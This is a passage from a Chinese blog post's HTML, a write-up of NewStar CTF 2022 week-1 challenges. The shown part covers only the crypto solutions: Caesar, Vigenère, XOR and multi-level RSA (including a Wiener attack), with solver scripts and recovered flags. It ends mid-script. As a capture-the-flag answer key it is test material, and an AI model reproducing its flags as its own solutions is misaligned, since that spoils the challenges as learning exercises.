@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>Newstar CTF 2022 week1 | fevergun</title>
+  <meta name="description" content="Newstar 2022 |week1一个月的newstar比赛，提供了一次很好的入门机会，边学边做，提高了很多。在此感谢出题的师傅们。直到现在有时间整理下题目做法，开始陆续写写wp。我还专门注册了一个新号上去看看能不能参加，现在也行，给出题人和buu平台点个赞！ week1的题目比较简单，在此复现和记录一下。入口链接：https:&#x2F;&#x2F;buuoj.cn&#x2F;match&#x2F;matches&#x2F;146   Cr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Newstar CTF 2022 week1">
+<meta property="og:url" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Newstar 2022 |week1一个月的newstar比赛，提供了一次很好的入门机会，边学边做，提高了很多。在此感谢出题的师傅们。直到现在有时间整理下题目做法，开始陆续写写wp。我还专门注册了一个新号上去看看能不能参加，现在也行，给出题人和buu平台点个赞！ week1的题目比较简单，在此复现和记录一下。入口链接：https:&#x2F;&#x2F;buuoj.cn&#x2F;match&#x2F;matches&#x2F;146   Cr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666968263288.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666970210266.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666970221279.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666971333098.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666971521832.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666971627999.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666971798719.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666971822266.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667019848752.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667020179931.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667020155135.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667020357603.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667020681801.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667022014024.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667022960737.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667024642603.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667030197038.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667037496052.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667037519263.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667037903600.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667038032200.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667047014556.png">
+<meta property="og:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1667052387343.png">
+<meta property="article:published_time" content="2022-10-29T14:28:10.000Z">
+<meta property="article:modified_time" content="2022-10-29T14:36:32.794Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="RSA">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/1666968263288.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.png" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">fevergun</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Ctfer &amp; Reverse &amp; Crypto</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/feverhu" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://blog.csdn.net/fevergun" target="_blank" title="Csdn" data-toggle=tooltip data-placement=top><i class="icon icon-csdn"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>大家好!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LCG/" rel="tag">LCG</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NTRU/" rel="tag">NTRU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NTURE/" rel="tag">NTURE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/" rel="tag">RSA</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TEA/" rel="tag">TEA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/angr/" rel="tag">angr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tags/" rel="tag">tags</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" rel="tag">异常处理</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/LCG/" style="font-size: 13px;">LCG</a> <a href="/tags/NTRU/" style="font-size: 13px;">NTRU</a> <a href="/tags/NTURE/" style="font-size: 13px;">NTURE</a> <a href="/tags/RSA/" style="font-size: 14px;">RSA</a> <a href="/tags/TEA/" style="font-size: 13px;">TEA</a> <a href="/tags/angr/" style="font-size: 13px;">angr</a> <a href="/tags/php/" style="font-size: 13px;">php</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/tags/" style="font-size: 13px;">tags</a> <a href="/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" style="font-size: 13px;">异常处理</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/match/">match</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/10/29/Newstar-CTF-2022-week1/" class="title">Newstar CTF 2022 week1</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-10-29T14:28:10.000Z" itemprop="datePublished">2022-10-29</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/09/16/NTRU/" class="title">NTRU</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-09-16T12:56:51.000Z" itemprop="datePublished">2022-09-16</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Crypto/">Crypto</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/09/16/%E8%A7%A3%E5%86%B3LCG%E6%9C%AA%E7%9F%A5%E5%8F%82%E6%95%B0%E7%9A%84%E5%8A%9E%E6%B3%95/" class="title">解决LCG未知参数的办法</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-09-16T03:53:58.000Z" itemprop="datePublished">2022-09-16</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Crypto/">Crypto</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/09/03/%E5%A4%9A%E9%A1%B9%E5%BC%8FRSA-NTRU/" class="title">多项式RSA</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-09-02T16:08:24.000Z" itemprop="datePublished">2022-09-03</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/match/">match</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/" class="title">2022 长城杯政企组 wp</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-08-25T16:05:23.000Z" itemprop="datePublished">2022-08-26</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-Newstar-CTF-2022-week1" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Newstar CTF 2022 week1
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/10/29/Newstar-CTF-2022-week1/" class="article-date">
+	  <time datetime="2022-10-29T14:28:10.000Z" itemprop="datePublished">2022-10-29</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/match/">match</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/RSA/" rel="tag">RSA</a>, <a class="article-tag-link-link" href="/tags/php/" rel="tag">php</a>, <a class="article-tag-link-link" href="/tags/python/" rel="tag">python</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/10/29/Newstar-CTF-2022-week1/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 3,016(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 16(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1><span id="newstar-2022-week1">Newstar 2022 |week1</span></h1><p>一个月的newstar比赛，提供了一次很好的入门机会，边学边做，提高了很多。在此感谢出题的师傅们。直到现在有时间整理下题目做法，开始陆续写写wp。我还专门注册了一个新号上去看看能不能参加，现在也行，给出题人和buu平台点个赞！</p>
+<p><strong>week1</strong>的题目比较简单，在此复现和记录一下。入口链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/146">https://buuoj.cn/match/matches/146</a></p>
+<!-- toc -->
+<ul>
+<li><a href="#crypto">Crypto</a><ul>
+<li><a href="#caeser">caeser</a></li>
+<li><a href="#吉奥万巴蒂斯塔贝拉索先生的密码">吉奥万·巴蒂斯塔·贝拉索先生的密码</a></li>
+<li><a href="#easyxor">easyxor</a></li>
+<li><a href="#rsa_begin">RSA_begin</a></li>
+<li><a href="#chaos">chaos</a></li>
+</ul>
+</li>
+<li><a href="#misc">Misc</a><ul>
+<li><a href="#yesec-no-drumsticks-1">Yesec no drumsticks 1</a></li>
+<li><a href="#qsdzs-girlfriend-1">qsdz’s girlfriend 1</a></li>
+<li><a href="#look-my-eyes">Look my eyes</a></li>
+<li><a href="#ezsnake">EzSnake</a></li>
+<li><a href="#奇怪的音频">奇怪的音频。</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn</a><ul>
+<li><a href="#ret2text">ret2text</a></li>
+<li><a href="#calc">calc</a></li>
+<li><a href="#ret2libc">ret2libc</a></li>
+<li><a href="#ret2shellcode">ret2shellcode</a></li>
+<li><a href="#fallw1nds-gift">fallw1nd’s gift</a></li>
+</ul>
+</li>
+<li><a href="#reverse">Reverse</a><ul>
+<li><a href="#hello_reverse">Hello_Reverse</a></li>
+<li><a href="#baby_re">Baby_Re</a></li>
+<li><a href="#pyre">Pyre</a></li>
+<li><a href="#easyre">EasyRe</a></li>
+<li><a href="#艾克体悟题">艾克体悟题</a></li>
+</ul>
+</li>
+<li><a href="#web">Web</a><ul>
+<li><a href="#http">HTTP</a></li>
+<li><a href="#headheader">Head?Header!</a></li>
+<li><a href="#我真的会谢">我真的会谢</a></li>
+<li><a href="#notphp">NotPHP</a></li>
+<li><a href="#word-for-you">Word-For-You</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+<h2><span id="crypto">Crypto</span></h2><h3><span id="caeser">caeser</span></h3><p>去随波逐流一键解密。</p>
+<p><img src="1666968263288.png" alt></p>
+<h3><span id="吉奥万巴蒂斯塔贝拉索先生的密码">吉奥万·巴蒂斯塔·贝拉索先生的密码</span></h3><p>维吉尼亚解密：<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
+<p><img src="1666970210266.png" alt></p>
+<p><img src="1666970221279.png" alt></p>
+<h3><span id="easyxor">easyxor</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) ^ <span class="number">0x9b</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(cipher[i] ^ x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;x0r_i5_qu1t3_3azy&#125;</span></span><br></pre></td></tr></table></figure>
+<h3><span id="rsa_begin">RSA_begin</span></h3><p>这道题应该是本次密码最难的题目。</p>
+<p><strong>level5</strong>：卡住了，问了问大佬。</p>
+<p><img src="1.png" alt></p>
+<p>这样的话，$hint * e^e - 1$包含了$p$这个质因数，可以和n求最大公约数解出来$p$。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 1:</span></span><br><span class="line">c = <span class="number">22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905</span></span><br><span class="line">p = <span class="number">6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351</span></span><br><span class="line">q = <span class="number">9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, p * q))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#Level 2:</span></span><br><span class="line">c = <span class="number">17250922799297131008803303235771955129</span></span><br><span class="line">n = <span class="number">134097988095851988085603926250918812377</span></span><br><span class="line">p = <span class="number">10094271714305059493</span></span><br><span class="line">q = <span class="number">13284562957208247589</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, p * q))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 3:</span></span><br><span class="line">c = <span class="number">2776571135646565181849912433877522437622755332262910824866791711</span></span><br><span class="line">n = <span class="number">85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157</span></span><br><span class="line">flag += long_to_bytes(iroot(c, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 4:</span></span><br><span class="line">c = <span class="number">68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191</span></span><br><span class="line">e = <span class="number">51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751</span></span><br><span class="line">n = <span class="number">68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969</span></span><br><span class="line"><span class="keyword">import</span> RSAwienerHacker</span><br><span class="line">d=RSAwienerHacker.hack_RSA(e,n)</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 5:</span></span><br><span class="line">c = <span class="number">1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829</span></span><br><span class="line">hint = <span class="number">611144874477135520868450203622074557606421849009025270666985817360484127602945558050689975570970227439583312738313767886380304814871432558985582586031211416586296452510050692235459883608453661597776103386009579351911278185434163016083552988251266501525188362673472772346212970459561496301631587043106524741903627979311997541301471894670374945556313285203740782346029579923650160327646876967315182335114575921178144825057359851607166387868294019144940296084605930</span></span><br><span class="line">n = <span class="number">1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">tmp = <span class="built_in">pow</span>(e, e, n)</span><br><span class="line">p = GCD((hint * tmp) % n - <span class="number">1</span>, n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = n // (p * p)</span><br><span class="line">d = inverse(e, p * (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<h3><span id="chaos">chaos</span></h3><p>这是一道基础爆破题目，题目比较长，不要被吓到。已知k1,k2和k(a_1, timea1, b_1, timeb1, xc_1, yc_1)，就可以直接利用LC求miu和omiga。然后爆破下就行了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1, k2 = 3.967139695598587, 3.7926025078694305                                           </span><br><span class="line">k = [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]           </span><br><span class="line">c = [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def init(): </span><br><span class="line">    sum, r = 0, 1</span><br><span class="line">    for i in range(16): </span><br><span class="line">        sum += k[i]</span><br><span class="line">        r ^= k[i]  </span><br><span class="line">    a_1 = (sum/256) % 1 </span><br><span class="line">    timea1 = 3 + int(1000 * a_1) % 30</span><br><span class="line">    b_1 = (r/256)</span><br><span class="line">    timeb1 = 3 + int(1000 * b_1) % 30</span><br><span class="line">    xc_1 = a_1 * b_1</span><br><span class="line">    yc_1 = (a_1 + b_1) % 1</span><br><span class="line">    print(&#x27;k1, k2 = %r, 